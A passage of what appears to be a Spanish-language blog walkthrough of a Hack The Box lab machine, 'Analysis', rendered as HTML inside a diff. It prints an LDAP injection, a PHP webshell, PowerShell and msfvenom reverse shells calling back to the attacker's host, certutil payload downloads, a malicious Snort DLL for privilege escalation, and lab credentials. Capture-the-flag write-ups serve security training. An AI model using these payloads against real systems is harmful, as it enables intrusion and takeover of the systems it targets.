+200      GET        4l        4w       35c http://internal.analysis.htb/dashboard/Details.php
+404      GET        0l        0w     1259c http://internal.analysis.htb/dashboard/lib/DRHM
+200      GET        4l        4w       35c http://internal.analysis.htb/dashboard/Form.php
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos un panel de login.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/analysis/6.png" />
+</p>
+
+<ul>
+  <li>Aquí ya encontramos algo interesante.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/analysis/7.png" />
+</p>
+
+<ul>
+  <li>Nos esta pidiendo un parámetro también podemos <code class="language-plaintext highlighter-rouge">fuzzear</code> para encontrarlo.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content ffuf <span class="nt">-u</span> http://internal.analysis.htb/users/list.php<span class="se">\?</span>FUZZ<span class="se">\=</span> <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/api/api-endpoints-res.txt <span class="nt">-ac</span>
+
+        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://internal.analysis.htb/users/list.php?FUZZ=
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/api/api-endpoints-res.txt
+ :: Follow redirects : false
+ :: Calibration      : true
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+name                    [Status: 200, Size: 406, Words: 11, Lines: 1, Duration: 91ms]
+:: Progress: [12334/12334] :: Job [1/1] :: 441 req/sec :: Duration: [0:00:27] :: Errors: 0 ::
+</span></code></pre></div></div>
+
+<h2 id="ldap-injection">LDAP Injection</h2>
+
+<ul>
+  <li>
+    <p>https://book.hacktricks.xyz/v/es/pentesting-web/ldap-injection</p>
+  </li>
+  <li>
+    <p>Vemos <code class="language-plaintext highlighter-rouge">output</code>.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/analysis/8.png" />
+</p>
+
+<ul>
+  <li>Si ponemos un carácter vemos que ya nos devuelve otra cosa.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/analysis/9.png" />
+</p>
+
+<ul>
+  <li>Vemos que hay un apartado que se llama <code class="language-plaintext highlighter-rouge">Username</code> como el puerto de <code class="language-plaintext highlighter-rouge">kerberos</code> esta abierto podemos enumerar usuarios.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content /opt/kerbrute_linux_amd64 userenum <span class="nt">--dc</span> 10.10.11.250 <span class="nt">-d</span> analysis.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+
+    __             __               __
+   / /_____  _____/ /_  _______  __/ /____
+  / //_/ _ <span class="se">\/</span> ___/ __ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\</span>
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|<span class="se">\_</span>__/_/  /_.___/_/   <span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/
+
+Version: v1.0.3 <span class="o">(</span>9dad6e1<span class="o">)</span> - 06/07/24 - Ronnie Flathers @ropnop
+
+2024/06/07 12:59:41 <span class="o">&gt;</span>  Using KDC<span class="o">(</span>s<span class="o">)</span>:
+2024/06/07 12:59:41 <span class="o">&gt;</span>  	10.10.11.250:88
+
+2024/06/07 13:00:43 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 jdoe@analysis.htb
+2024/06/07 13:01:35 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 ajohnson@analysis.htb
+2024/06/07 13:03:34 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 cwilliams@analysis.htb
+2024/06/07 13:04:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 wsmith@analysis.htb
+2024/06/07 13:07:23 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 jangel@analysis.htb
+2024/06/07 13:18:21 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 technician@analysis.htb
+</code></pre></div></div>
+
+<ul>
+  <li>No podemos obtener el hash de ningún usuario.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-GetNPUsers <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> usrs.txt analysis.htb/
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+<span class="o">[</span>-] User jdoe doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User ajohnson doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User cwilliams doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User wsmith doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User jangel doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User technician doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Podemos poner <code class="language-plaintext highlighter-rouge">a*</code> que significa empieza por a pero no sabe en que acaba.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/analysis/10.png" />
+</p>
+
+<ul>
+  <li>
+    <p>En LDAP existen atributos aquí nos comparten los que son <a href="https://documentation.sailpoint.com/connectors/active_directory/help/integrating_active_directory/ldap_names.html">https://documentation.sailpoint.com/connectors/active_directory/help/integrating_active_directory/ldap_names.html</a> en AD vemos que por ejemplo <code class="language-plaintext highlighter-rouge">First Name</code> en <code class="language-plaintext highlighter-rouge">LDAP</code> es <code class="language-plaintext highlighter-rouge">givenName</code>.</p>
+  </li>
+  <li>
+    <p>Con esto podemos saber que se esta aplicando una <code class="language-plaintext highlighter-rouge">LDAP Injection</code>.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/analysis/11.png" />
+</p>
+
+<ul>
+  <li>Podemos combinar atributos en este caso el campo <code class="language-plaintext highlighter-rouge">Last Name</code> corresponde a <code class="language-plaintext highlighter-rouge">sn</code>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/analysis/12.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Con esta <code class="language-plaintext highlighter-rouge">LDAP Injection</code> también podemos enumerar usuarios.</p>
+  </li>
+  <li>
+    <p><a href="https://github.com/MikeRega7/Scripts/blob/main/HackTheBox/analysis/brute2.py">https://github.com/MikeRega7/Scripts/blob/main/HackTheBox/analysis/brute2.py</a></p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content python3 brute2.py
+<span class="o">[</span>-] Invalid or no user <span class="k">for</span>: c
+<span class="o">[</span>+] Valid user: amanson
+<span class="o">[</span>-] Invalid or no user <span class="k">for</span>: e
+<span class="o">[</span>-] Invalid or no user <span class="k">for</span>: f
+<span class="o">[</span>-] Invalid or no user <span class="k">for</span>: g
+<span class="o">[</span>+] Valid user: jangel
+<span class="o">[</span>+] Valid user: badam
+<span class="o">[</span>-] Invalid or no user <span class="k">for</span>: d
+<span class="o">[</span>-] Invalid or no user <span class="k">for</span>: h
+<span class="o">[</span>-] Invalid or no user <span class="k">for</span>: i
+<span class="o">[</span>-] Invalid or no user <span class="k">for</span>: k
+<span class="o">[</span>+] Valid user: lzen
+<span class="o">[</span>-] Invalid or no user <span class="k">for</span>: n
+<span class="o">[</span>-] Invalid or no user <span class="k">for</span>: m
+<span class="o">[</span>-] Invalid or no user <span class="k">for</span>: o
+<span class="o">[</span>-] Invalid or no user <span class="k">for</span>: p
+<span class="o">[</span>-] Invalid or no user <span class="k">for</span>: q
+<span class="o">[</span>+] Valid user: technician
+<span class="o">[</span>-] Invalid or no user <span class="k">for</span>: r
+<span class="o">[</span>-] Invalid or no user <span class="k">for</span>: s
+<span class="o">[</span>-] Invalid or no user <span class="k">for</span>: u
+<span class="o">[</span>-] Invalid or no user <span class="k">for</span>: v
+<span class="o">[</span>-] Invalid or no user <span class="k">for</span>: x
+<span class="o">[</span>-] Invalid or no user <span class="k">for</span>: w
+<span class="o">[</span>-] Invalid or no user <span class="k">for</span>: y
+<span class="o">[</span>-] Invalid or no user <span class="k">for</span>: z
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Son los mismos usuarios.</p>
+  </li>
+  <li>
+    <p>En el atributo de <code class="language-plaintext highlighter-rouge">description</code> en LDAP se suelen almacenar contraseñas gracias ala persona que compartió su script para hacerlo <code class="language-plaintext highlighter-rouge">in1t</code> <a href="https://obx0x3.tech/whoami/">https://obx0x3.tech/whoami/</a>.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>97NTtl<span class="k">*</span>4QP96Bv
+</code></pre></div></div>
+
+<ul>
+  <li>Las credenciales son correctas.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content cme smb 10.10.11.250 <span class="nt">-u</span> <span class="s1">'technician'</span> <span class="nt">-p</span> <span class="s1">'97NTtl*4QP96Bv'</span>
+SMB         10.10.11.250    445    DC-ANALYSIS      <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC-ANALYSIS<span class="o">)</span> <span class="o">(</span>domain:analysis.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.11.250    445    DC-ANALYSIS      <span class="o">[</span>+] analysis.htb<span class="se">\t</span>echnician:97NTtl<span class="k">*</span>4QP96Bv
+</code></pre></div></div>
+
+<ul>
+  <li>Si probamos las credenciales en el <code class="language-plaintext highlighter-rouge">login</code> funcionan.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/analysis/13.png" />
+</p>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/analysis/14.png" />
+</p>
+
+<ul>
+  <li>Vemos varios <code class="language-plaintext highlighter-rouge">Tickets</code>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/analysis/15.png" />
+</p>
+
+<ul>
+  <li>Aquí nos deja subir archivos.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/analysis/16.png" />
+</p>
+
+<ul>
+  <li>Vamos a subir algún archivo.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/analysis/17.png" />
+</p>
+
+<ul>
+  <li>La ruta donde se guardan existe.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/analysis/18.png" />
+</p>
+
+<ul>
+  <li>Si conoces el nombre del recurso en este caso el que subiste vemos que podemos ver.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/analysis/19.png" />
+</p>
+
+<ul>
+  <li>Vamos a subir una <code class="language-plaintext highlighter-rouge">webshell</code> para ganar acceso.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat </span>cmd.php
+&lt;?php
+	<span class="nb">echo</span> <span class="s2">"&lt;pre&gt;"</span> <span class="nb">.</span> shell_exec<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">'cmd'</span><span class="o">])</span> <span class="nb">.</span>  <span class="s2">"&lt;/pre&gt;"</span><span class="p">;</span>
+?&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>Podemos ejecutar comandos.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/analysis/20.png" />
+</p>
+
+<h2 id="shell-as-svc_web">Shell as svc_web</h2>
+
+<ul>
+  <li>Ahora vamos a ganar acceso <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1</a>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
+<span class="nt">--2024-06-07</span> 14:30:36--  https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
+Resolving raw.githubusercontent.com <span class="o">(</span>raw.githubusercontent.com<span class="o">)</span>... 185.199.111.133, 185.199.108.133, 185.199.109.133, ...
+Connecting to raw.githubusercontent.com <span class="o">(</span>raw.githubusercontent.com<span class="o">)</span>|185.199.111.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 4339 <span class="o">(</span>4.2K<span class="o">)</span> <span class="o">[</span>text/plain]
+Saving to: ‘Invoke-PowerShellTcp.ps1’
+
+Invoke-PowerShellTcp.ps1             100%[<span class="o">=====================================================================&gt;]</span>   4.24K  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0s
+
+2024-06-07 14:30:36 <span class="o">(</span>40.0 MB/s<span class="o">)</span> - ‘Invoke-PowerShellTcp.ps1’ saved <span class="o">[</span>4339/4339]
+
+➜  content <span class="nb">mv </span>Invoke-PowerShellTcp.ps1 ps.ps1
+➜  content <span class="nb">echo</span> <span class="s1">'Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.63 -Port 443'</span> <span class="o">&gt;&gt;</span> ps.ps1
+</code></pre></div></div>
+
+<ul>
+  <li>Nos ponemos en escucha.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap <span class="nt">-cAr</span> nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content python3 <span class="nt">-m</span> http.server 80
+Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora usamos la <code class="language-plaintext highlighter-rouge">webshell</code>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/analysis/21.png" />
+</p>
+
+<ul>
+  <li>Nos llega la shell.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap <span class="nt">-cAr</span> nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.63] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.250] 54783
+Windows PowerShell running as user DC-ANALYSIS<span class="nv">$ </span>on DC-ANALYSIS
+Copyright <span class="o">(</span>C<span class="o">)</span> 2015 Microsoft Corporation. All rights reserved.
+
+PS C:<span class="se">\i</span>netpub<span class="se">\i</span>nternal<span class="se">\d</span>ashboard<span class="se">\u</span>ploads&gt;whoami
+analysis<span class="se">\s</span>vc_web
+PS C:<span class="se">\i</span>netpub<span class="se">\i</span>nternal<span class="se">\d</span>ashboard<span class="se">\u</span>ploads&gt;
+</code></pre></div></div>
+
+<h2 id="shell-as-jdoe">Shell as jdoe</h2>
+
+<ul>
+  <li>Vamos a enumerar el sistema.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\t</span>est&gt; certutil.exe <span class="nt">-f</span> <span class="nt">-urlcache</span> <span class="nt">-split</span> http://10.10.14.63:8080/winPEASx64.exe
+<span class="k">****</span>  En ligne  <span class="k">****</span>
+  000000  ...
+  246e00
+CertUtil: <span class="nt">-URLCache</span> La commande s?est termin?e correctement.
+</code></pre></div></div>
+
+<ul>
+  <li>Después de correr el winPEASx64 nos da las credenciales del usuario <code class="language-plaintext highlighter-rouge">jdoe:7y4Z4^*y9Zzj</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  Downloads cme smb analysis.htb <span class="nt">-u</span> jdoe <span class="nt">-p</span> <span class="s1">'7y4Z4^*y9Zzj'</span>
+SMB         internal.analysis.htb 445    DC-ANALYSIS      <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC-ANALYSIS<span class="o">)</span> <span class="o">(</span>domain:analysis.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         internal.analysis.htb 445    DC-ANALYSIS      <span class="o">[</span>+] analysis.htb<span class="se">\j</span>doe:7y4Z4^<span class="k">*</span>y9Zzj
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos que también podemos conectarnos con <code class="language-plaintext highlighter-rouge">evil-winrm</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  Downloads cme winrm analysis.htb <span class="nt">-u</span> jdoe <span class="nt">-p</span> <span class="s1">'7y4Z4^*y9Zzj'</span>
+SMB         internal.analysis.htb 5985   DC-ANALYSIS      <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 <span class="o">(</span>name:DC-ANALYSIS<span class="o">)</span> <span class="o">(</span>domain:analysis.htb<span class="o">)</span>
+HTTP        internal.analysis.htb 5985   DC-ANALYSIS      <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://internal.analysis.htb:5985/wsman
+WINRM       internal.analysis.htb 5985   DC-ANALYSIS      <span class="o">[</span>+] analysis.htb<span class="se">\j</span>doe:7y4Z4^<span class="k">*</span>y9Zzj <span class="o">(</span>Pwn3d!<span class="o">)</span>
+</code></pre></div></div>
+
+<h2 id="user-flag">User flag</h2>
+
+<ul>
+  <li>Ya podemos leer la <code class="language-plaintext highlighter-rouge">flag</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  Downloads evil-winrm <span class="nt">-i</span> 10.10.11.250 <span class="nt">-u</span> <span class="s1">'jdoe'</span> <span class="nt">-p</span> <span class="s1">'7y4Z4^*y9Zzj'</span>
+
+Evil-WinRM shell v3.5
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\j</span>doe<span class="se">\D</span>ocuments&gt; <span class="nb">type</span> ..<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
+cdb21e01560374f401e7d5b960a73d53
+</code></pre></div></div>
+
+<h2 id="escalada-de-privilegios">Escalada de Privilegios</h2>
+
+<ul>
+  <li>Vemos que esta <code class="language-plaintext highlighter-rouge">snort</code> por allí <a href="https://protecciondatos-lopd.com/empresas/snort-deteccion-intrusos/">https://protecciondatos-lopd.com/empresas/snort-deteccion-intrusos/</a>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\&gt;</span> <span class="nb">dir
+
+
+    </span>Directory: C:<span class="se">\</span>
+
+
+Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+d-----        6/12/2023  10:01 AM                inetpub
+d-----        11/5/2022   8:14 PM                PerfLogs
+d-----         5/8/2023  10:20 AM                PHP
+d-----         7/9/2023  10:54 AM                private
+d-r---       11/18/2023   9:56 AM                Program Files
+d-----         5/8/2023  10:11 AM                Program Files <span class="o">(</span>x86<span class="o">)</span>
+d-----         7/9/2023  10:57 AM                Snort
+d-r---        5/26/2023   2:20 PM                Users
+d-----        1/10/2024   3:52 PM                Windows
+<span class="nt">-a----</span>         6/7/2024  11:17 PM         310050 snortlog.txt
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Encontramos en el manual información interesante <a href="http://manual-snort-org.s3-website-us-east-1.amazonaws.com/node23.html">http://manual-snort-org.s3-website-us-east-1.amazonaws.com/node23.html</a>.</p>
+  </li>
+  <li>
+    <p>Podemos cargar una <code class="language-plaintext highlighter-rouge">dll</code> maliciosa.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/analysis/22.png" />
+</p>
+
+<ul>
+  <li>Aquí están las <code class="language-plaintext highlighter-rouge">ddl</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\S</span>nort<span class="se">\e</span>tc&gt; <span class="nb">type </span>snort.conf | findstr dynamicpreprocessor
+dynamicpreprocessor directory C:<span class="se">\S</span>nort<span class="se">\l</span>ib<span class="se">\s</span>nort_dynamicpreprocessor
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\S</span>nort<span class="se">\e</span>tc&gt; <span class="nb">dir </span>C:<span class="se">\S</span>nort<span class="se">\l</span>ib<span class="se">\s</span>nort_dynamicpreprocessor
+
+
+    Directory: C:<span class="se">\S</span>nort<span class="se">\l</span>ib<span class="se">\s</span>nort_dynamicpreprocessor
+
+
+Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+<span class="nt">-a----</span>        5/24/2022   6:46 AM         207872 sf_dce2.dll
+<span class="nt">-a----</span>        5/24/2022   6:46 AM          33792 sf_dnp3.dll
+<span class="nt">-a----</span>        5/24/2022   6:46 AM          22528 sf_dns.dll
+<span class="nt">-a----</span>        5/24/2022   6:46 AM         108032 sf_ftptelnet.dll
+<span class="nt">-a----</span>        5/24/2022   6:46 AM          47616 sf_gtp.dll
+<span class="nt">-a----</span>        5/24/2022   6:47 AM          59392 sf_imap.dll
+<span class="nt">-a----</span>        5/24/2022   6:47 AM          23552 sf_modbus.dll
+<span class="nt">-a----</span>        5/24/2022   6:47 AM          58368 sf_pop.dll
+<span class="nt">-a----</span>        5/24/2022   6:47 AM          52736 sf_reputation.dll
+<span class="nt">-a----</span>        5/24/2022   6:47 AM          37888 sf_sdf.dll
+<span class="nt">-a----</span>        5/24/2022   6:47 AM          52224 sf_sip.dll
+<span class="nt">-a----</span>        5/24/2022   6:47 AM          78848 sf_smtp.dll
+<span class="nt">-a----</span>        5/24/2022   6:47 AM          22016 sf_ssh.dll
+<span class="nt">-a----</span>        5/24/2022   6:47 AM          32256 sf_ssl.dll
+</code></pre></div></div>
+
+<ul>
+  <li>Podemos subir la <code class="language-plaintext highlighter-rouge">dll</code> maliciosa.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\S</span>nort<span class="se">\l</span>ib&gt; icacls snort_dynamicpreprocessor
+snort_dynamicpreprocessor AUTORITE NT<span class="se">\S</span>ystŠme:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>F<span class="o">)</span>
+                          BUILTIN<span class="se">\A</span>dministrateurs:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>F<span class="o">)</span>
+                          BUILTIN<span class="se">\U</span>tilisateurs:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>RX<span class="o">)</span>
+                          BUILTIN<span class="se">\U</span>tilisateurs:<span class="o">(</span>I<span class="o">)(</span>CI<span class="o">)(</span>AD<span class="o">)</span>
+                          BUILTIN<span class="se">\U</span>tilisateurs:<span class="o">(</span>I<span class="o">)(</span>CI<span class="o">)(</span>WD<span class="o">)</span>
+                          CREATEUR PROPRIETAIRE:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>IO<span class="o">)(</span>F<span class="o">)</span>
+
+Successfully processed 1 files<span class="p">;</span> Failed processing 0 files
+</code></pre></div></div>
+
+<ul>
+  <li>Podemos crear la <code class="language-plaintext highlighter-rouge">dll</code> con <code class="language-plaintext highlighter-rouge">msfvenom</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content msfvenom <span class="nt">-p</span> windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.63 <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nt">-f</span> dll <span class="nt">-a</span> x64 <span class="nt">-o</span> mg.dll
+<span class="o">[</span>-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of dll file: 9216 bytes
+Saved as: mg.dll
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora lo pasamos ala maquina.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content python3 <span class="nt">-m</span> http.server 80
+Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+10.10.11.250 - - <span class="o">[</span>07/Jun/2024 15:33:59] <span class="s2">"GET /mg.dll HTTP/1.1"</span> 200 -
+10.10.11.250 - - <span class="o">[</span>07/Jun/2024 15:33:59] <span class="s2">"GET /mg.dll HTTP/1.1"</span> 200 -
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\S</span>nort<span class="se">\l</span>ib<span class="se">\s</span>nort_dynamicpreprocessor&gt; certutil.exe <span class="nt">-f</span> <span class="nt">-urlcache</span> <span class="nt">-split</span> http://10.10.14.63/mg.dll
+<span class="k">****</span>  Online  <span class="k">****</span>
+  0000  ...
+  2400
+CertUtil: <span class="nt">-URLCache</span> <span class="nb">command </span>completed successfully.
+</code></pre></div></div>
+
+<h2 id="shell-as-root">Shell as root</h2>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">Snort</code> carga la <code class="language-plaintext highlighter-rouge">dll</code> automáticamente cada cierto tiempo así que cuando la carga nos llega la <code class="language-plaintext highlighter-rouge">shell</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap <span class="nt">-cAr</span> nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.63] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.250] 55072
+Microsoft Windows <span class="o">[</span>Version 10.0.17763.5329]
+<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
+<span class="nb">whoami
+</span>analysis<span class="se">\a</span>dministrateur
+</code></pre></div></div>
+
+<h2 id="root-flag">Root flag</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrateur<span class="se">\D</span>esktop&gt;type root.txt
+<span class="nb">type </span>root.txt
+68d63d846dcaa03ffaaa05975e3a40f1
+</code></pre></div></div>
+
+  </div><a class="u-url" href="/hackthebox/machines/hard/2024/06/07/analysis.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+        <p class="feed-subscribe">
+          <a href="http://localhost:4000/feed.xml">
+            <svg class="svg-icon orange">
+              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
+            </svg><span>Subscribe</span>
+          </a>
+        </p>
+        <ul class="contact-list">
+          <li class="p-name">MiguelRega7</li>
+          
+        </ul>
+      </div>
+      <div class="footer-col">
+        <p>Posts sobre resolución de CTFs y ciberseguridad.
+</p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"><li>
+  <a rel="me" href="https://github.com/MikeRega7" target="_blank" title="github">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#github"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.instagram.com/_darkhorse77?igsh=MWZqYTAyYnJmYWZrdg%3D%3D&utm_source=qr" target="_blank" title="instagram">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#instagram"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" title="linkedin">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#linkedin"></use>
+    </svg>
+  </a>
+</li>
+<li>
